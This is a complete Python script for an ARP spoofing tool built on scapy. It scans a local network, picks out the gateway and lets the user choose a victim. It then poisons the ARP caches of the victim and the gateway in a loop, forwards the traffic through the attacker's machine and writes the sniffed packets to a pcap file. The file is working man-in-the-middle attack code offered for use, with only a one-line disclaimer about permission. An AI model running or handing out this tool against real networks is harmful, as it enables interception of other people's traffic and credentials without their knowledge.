#!/usr/bin/env python3
# Arp Spoofing Tool
# Disclaimer: Use this script responsibly and only in environments where you have explicit permission to conduct network penetration testing or security assessments.

import os, sys, time, subprocess, threading, argparse, logging, copy, datetime, socket, inquirer
import scapy.all as scapy
from ipaddress import IPv4Network
from typing import Union
from tabulate import tabulate

# Configuring logging module with a specific format and log level.
PREFIX = '\033['
SUFFIX = '\033[0m'
MAPPING = {
    'DEBUG': 37,
    'INFO': 36,
    'WARNING': 33,
    'ERROR': 31,
    'CRITICAL': 41,
    'TIME': 32
}

# Log formatter
class LogFormatter(logging.Formatter):
    def format(self, record):
        # Customize the log record's formatting by adding ANSI color codes for log level.
        colored_record = copy.copy(record)
        levelname = colored_record.levelname
        seq = MAPPING.get(levelname, 37)
        colored_record.levelname = ('{0}{1}m{2}{3}'.format(PREFIX, seq, levelname, SUFFIX))
        return logging.Formatter.format(self, colored_record)
    def formatTime(self, record, datefmt=None):
        # Customize the time format.
        seq = MAPPING.get('TIME', 37)
        converter = datetime.datetime.fromtimestamp(record.created)
        if datefmt:
            t = converter.strftime(datefmt)
            s = '{0}{1}m{2}{3}'.format(PREFIX, seq, t, SUFFIX)
        else:
            t = converter.strftime('%Y-%m-%d %H:%M:%S')
            f = '%s,%03d' % (t, record.msecs)
            s = '{0}{1}m{2}{3}'.format(PREFIX, seq, f, SUFFIX)
        return s

# Create a console handler for displaying log on the console.
ch = logging.StreamHandler()
logger = logging.getLogger(__name__)

# Create a custom formatter with desired time format.
formatter = LogFormatter('[%(asctime)s] [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
ch.setFormatter(formatter)
logger.addHandler(ch)

# Check if the effective user ID is not 0 (non root).
if os.geteuid() != 0:
    logger.error('This script requires root privileges. Please run as root or with sudo.')
    sys.exit(1)

# Argument parser using arparse to define and parse command-line argument.
parser = argparse.ArgumentParser(description='Perform ARP spoofing attacks on a local network.')
parser.add_argument(
    '-c', '--cidr',
    help='Specify the CIDR notation for the IP range (e.g., 192.168.0.0/24)',
    required=True, dest='cidr'
)
parser.add_argument(
    '-d', '--debug',
    help='Print lots of debugging statements',
    action='store_const', dest='loglevel', const=logging.DEBUG,
    default=logging.INFO
)
args = parser.parse_args()
logger.setLevel(args.loglevel)

# Functions
def gethostname(ip_address: str) -> str:
    """
    Retrieve the hostname associated with the provided IP address.

    Arguments:
    - ip_address (str): The IP address to lookup.

    Returns:
    - str: The retrieved hostname associated with the provided IP address.
            If an error occurs during the retrieval, returns '*'.
    """
    try:
        hostname, _, _ = socket.gethostbyaddr(ip_address)
        return hostname
    except socket.herror:
        return '*'

def arp_scan(ip_range: str) -> list:
    """
    Perform an ARP (Address Resolution Protocol) scan on given ip range.

    Parameters:
    - ip_range (str): The IP range to scan in CIDR format (e.g., '192.168.0.0/24')

    Returns:
    - list: A list of dictionaries containing IP and MAC address pairs for devices that responded to the ARP scan.
      Each dictionaries has the format {'ip': '192.168.0.0', 'mac': '00:1a:2b:3c:4d:5e'}.

    Note:
    - This function uses the scapy library for sending ARP requests and collecting respones.
    """
    # Initialize an empty list to store ARP responses.
    arp_respones = []

    # Perform ARP scan and get the answered packets.
    answered, _ = scapy.arping(ip_range, verbose=0)

    # Process ARP responses.
    for response in answered:
        # Retrieve the IP address hostname
        hostname = gethostname(response[1].psrc)
        # Extract IP and MAC address from the ARP response and add them to the list.
        arp_respones.append({'ip': response[1].psrc, 'hostname': hostname, 'mac': response[1].hwsrc})
    return arp_respones

def gateway_check(gateway_ip: str) -> bool:
    """
    Check if the provided gateway IP address is present in the system's routing rable.

    Parameters:
    - gateway_ip (str): The gateway IP address to check (e.g., 192.168.0.0).
    
    Returns:
    - bool: True if the gateway IP is found in the routing table, False otherwise.
    """
    try:
        # Execute command and capture the output.
        output = subprocess.run(['route', '-n'], capture_output=True).stdout.decode().split('\n')
        return any(gateway_ip in row for row in output)
    except subprocess.CalledProcessError as e:
        logger.error(e)
        return False

def get_interface_names() -> list:
    """
    Get a list of network interface names from /sys/class/net directory.

    Returns:
    - list: A list of strings representing network interface names.
    """
    try:
        directory = '/sys/class/net'
        interfaces = [interface for interface in os.listdir(directory) if os.path.isdir(os.path.join(directory, interface))]
    except Exception as e:
        interfaces = []
        logger.error(e)
    return interfaces

def match_iface_name(row: str) -> Union[str,None]:
    """
    Match the network interface name in a given row using the list of available interface names.

    Arguments:
    - row (str): The input string containing information, possibly including a network interface name.

    Returns:
    - str or None: The matched network interface name found, None otherwise.
    """
    return next((iface for iface in get_interface_names() if iface in row), None)

def gateway_info(network: list) -> list:
    """
    Retrieve gateway information based on ARP scan results and find the corresponding network interface.

    Arguments:
    - network (list): ARP scan results obtained from the arp_scan function.

    Returns:
    - list: A list of dictionaries containing gateway information including network interface name, IP, and MAC address.
    """
    # Execute the command and capture the output
    output = subprocess.run(['route', '-n'], capture_output=True, text=True).stdout.split('\n')

    # Declare an empty list for the gateways.
    gateways = []

    # Iterate through each entry in the network list.
    for iface in network:
        # Iterate through each row from the command output.
        for row in output:
            # Check if the IP address from the ARP scan result is present i the foute information.
            if iface['ip'] in row:
                # Retrieve the network interface name corresponding information to the row.
                iface_name = match_iface_name(row)

                # Once found the gateway, create a dictionary with all the information.
                gateways.append({'iface': iface_name, 'ip': iface['ip'], 'mac': iface['mac']})
    return gateways

def clients(arp_responses: list, gateway_list: list) -> list:
    """
    Filter out gateway from the list ARP responses to obtain the list of client devices.

    Arguments:
    - arp_responses (list): The responses from the ARP scan.
    - gateway_list (list): The response from the gateway_info function.

    Returns:
    - list: Filtered list of dictionaries containing ARP responses from the client devices (excluding the gateway). 
    """
    # Provide access only to the clients whose ARP tables need to be poisoned, remove the gateway from the list.
    client_list = [arp_resp for arp_resp in arp_responses if arp_resp['ip'] not in (gw['ip'] for gw in gateway_list)]
    return client_list

def enable_ip_forwarding() -> bool:
    """
    Enable IP forwarding on a Linux system.

    Returns:
    - bool: True if IP forwarding is successfully enabled, False otherwise.
    """
    try:
        # Use sysctl to enable IP forwarding.
        output = subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], check=True, stdout=subprocess.DEVNULL)
        logger.info('IPv4 forwarding has been enabled.')
        return True
    except subprocess.CalledProcessError as e:
        logger.error(e)
        return False

def arp_spoofer(target_ip: str, target_mac: str, spoof_ip: str) -> None:
    """
    Send an ARP response packet to update the ARP table entries on the target machine.

    Arguments:
    - target_ip (str): Target IP address.
    - target_mac (str): Target MAC address.
    - spoof_ip (str): IP address to be spoofed (e.g., gateway IP)

    Note:
    - This function sends an ARP response packet to the target machine, indicating that specified IP (spoof_ip) is associated with the provided MAC address (target_mac).
    - It's typically used in ARP spoofing attacks, so use it responsibly and in compliance with applicable laws and ethical considerations.
    """
    # Create an ARP packet response (op=2 is "is-at" response).
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)

    # Send the ARP response packet.
    scapy.send(packet)

def send_packets(gateway: dict, target: dict, interval: int = 3, duration: int = None) -> None:
    """
    Continuesly sending ARP spoof packets to the gateway and target device.

    Arguments:
    - gateway (dict): Dictionary containing gateway information (ip and mac).
    - target (dict): Dictionary containing target information (ip and mac).
    - interval (int, optional): Time interval between sending spoof packets ( default is 3 seconds).
    - duration (int, optional): Duration (in seconds) to send spoof packets. If None, its run indefinitely.
    """
    end_time = time.time() + duration if duration is not None else float('inf')

    while time.time() < end_time:
        # Send an ARP packet to the gateway, claiming to be the target machine.
        arp_spoofer(gateway['ip'], gateway['mac'], target['ip'])

        # Send an ARP packet to the target machine, claiming to be the gateway.
        arp_spoofer(target['ip'], target['mac'], gateway['ip'])

        # Cooldown
        time.sleep(interval)

def packet_callback(packet):
    """
    Process each sniffed packet and write it to a pcap file.

    packet: Sniffed packet.
    """
    try:
        # Extract source and destionation IP addresses from the packet.
        source = packet[scapy.IP].src
        dest = packet[scapy.IP].dst

        # Log packet information
        logger.info('Packet sniffed - Source IP: %s, Dest IP: %s', source, dest)
    except Exception as e:
        logger.error(e)

    # Append every packet sniffed to the requests.pcap file which can be inspected with Wireshark.
    scapy.wrpcap('requests.pcap', packet, append=True)

def packet_sniff(interface: str) -> None:
    """
    Sniff packets on the specified interface and process them using a callback function.

    Arguments:
    - interface (str): Name of the network interface to sniff packets on.
    """
    # Use the sniff function to capture packets on the specified interface.
    scapy.sniff(iface=interface, store=False, prn=packet_callback)

# Enable IP forwarding in the system.
enable_ip_forwarding()

# Perform ARP scan on the specified IP range and retrieve a list of all clients in the network.
arp_response = arp_scan(args.cidr)

# Check if there are no devices found during ARP scan.
# If no devices are found, exit the program.
if len(arp_response) == 0:
    logger.critical('No devices found. Exiting. Make sure devices are active or turned on.')
    sys.exit(1)

# Execute the route -n command and retrieve information about gateways.
# The result is list of dictionaries, each containing details about gateway.
gateway_list = gateway_info(arp_response)

# Extract the gateway information from the list.
# Since the gateway is expected to be in position 0, assign it to the variable gateway
gateway = gateway_list[0]

# Remove gateways from the list of clients to isolate individual devices.
client = clients(arp_response, gateway_list)

# Check if there are no clients remaining after removing gateways.
# if no clients are found, exit the program
if len(client) == 0:
    logger.critical('No clients found after ARP messages. Exiting. Make sure devices are active or turned on.')
    sys.exit(1)

# Print the client devices information.
# Extract the keys and values from the client dictionaries.
keys = client[0].keys()
values = [list(device.values()) for device in client]

# Print the table
print(tabulate(values, headers=[key.upper() for key in keys], tablefmt='pretty'))

# Inquirer prompt.
questions = [
    inquirer.List('device',
                  message='Please select the device whose ARP cache you want to poison:',
                  choices=[device['ip'] for device in client])
]
answer = inquirer.prompt(questions)
# Choose the client node for ARP spoofing based on the user's selection.
device = next(device for device in client if device['ip'] == answer['device'])

# Set up a background thread for sending ARP spoof packets.
spoof_thread = threading.Thread(target=send_packets, daemon=True, args=(gateway, device,))
# Start the thread to perform ARP spoofing in the background.
spoof_thread.start()

# Run the packet sniffer on the specified network interface.
# Captured packets will be saved to a pcap file for analysis in Wireshark.
packet_sniff(gateway["iface"])